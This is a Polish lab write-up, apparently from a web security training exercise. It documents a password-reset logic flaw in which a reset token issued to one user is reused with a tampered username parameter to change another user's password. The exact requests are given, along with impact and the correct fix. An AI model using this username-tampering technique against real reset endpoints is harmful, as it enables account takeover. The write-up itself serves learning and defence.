LAB: Password reset broken logic
Kategoria: Authentication / Password Reset Logic
Utworzono: 2026-03-14 18:25 (Europe/Amsterdam)

---

1. CEL TESTU

   Sprawdzenie czy mechanizm resetowania hasła poprawnie
   wiąże token resetu z konkretnym użytkownikiem.

   Jeśli backend ufa parametrowi username z requestu,
   możliwe jest przejęcie konta innego użytkownika.

---

2. KONTEKST APLIKACJI

   Aplikacja posiada standardowy mechanizm resetu hasła.

   Flow resetu:

   1. użytkownik inicjuje reset hasła
   2. aplikacja generuje token resetu
   3. użytkownik otwiera link z tokenem
   4. ustawia nowe hasło

   Token resetu znajduje się w parametrze:

   temp-forgot-password-token

---

3. OBSERWACJA

   Formularz resetu wysyła request:

   POST /forgot-password?temp-forgot-password-token=<token>

   Body requestu zawiera parametry:

   temp-forgot-password-token
   username
   new-password-1
   new-password-2

   Wniosek:

   Backend otrzymuje username bezpośrednio z requestu.

---

4. HIPOTEZA

   Jeśli backend nie weryfikuje powiązania:

   token → konkretny użytkownik

   możliwe jest użycie tokenu jednego użytkownika
   do zmiany hasła innego użytkownika poprzez
   manipulację parametrem username.

---

5. ANALIZA MECHANIZMU

   Mechanizm resetu wygląda prawdopodobnie tak:

   użytkownik otwiera link resetu
   backend weryfikuje token
   backend ustawia nowe hasło dla username z requestu

   Problem:

   token nie jest powiązany z konkretnym użytkownikiem.

   Backend ufa parametrowi username.

---

6. REPRODUCTION / EXPLOIT

   Step 1

   Zainicjowanie resetu hasła dla użytkownika:

   wiener

   Step 2

   Otwarcie linku resetu zawierającego token.

   Step 3

   Przechwycenie requestu zmiany hasła:

   POST /forgot-password?temp-forgot-password-token=w5zwo8f23513wcveox3ri4mpm0jmp7dg

   Body:

   temp-forgot-password-token=w5zwo8f23513wcveox3ri4mpm0jmp7dg
   username=wiener
   new-password-1=babyjaga
   new-password-2=babyjaga

   Step 4

   Manipulacja parametrem username:

   username=carlos

   Finalny request:

   temp-forgot-password-token=w5zwo8f23513wcveox3ri4mpm0jmp7dg
   username=carlos
   new-password-1=babyjaga
   new-password-2=babyjaga

   Rezultat:

   hasło użytkownika carlos zostało zmienione.

   Step 5

   Logowanie:

   carlos:babyjaga

   Lab solved.

---

7. IMPACT

   Atakujący może zmienić hasło dowolnego użytkownika.

   Konsekwencje:

   - przejęcie kont
   - dostęp do danych użytkowników
   - pełna kompromitacja konta

---

8. DEBUGGING / PITFALLS

   Kluczowa obserwacja:

   backend ufa parametrowi username z requestu.

   Poprawny mechanizm powinien:

   - powiązać token z konkretnym użytkownikiem
   - ignorować username przesłany przez klienta.

---

9. MENTAL MODEL / PATTERN

   Password reset logic flaw.

   Backend powinien ufać wyłącznie tokenowi resetu,
   który identyfikuje użytkownika.

   Jeśli aplikacja używa jednocześnie:

   token
   username

   należy sprawdzić czy można zmienić username
   w request.

   Pattern do zapamiętania:

   token resetu + manipulacja username → przejęcie konta.
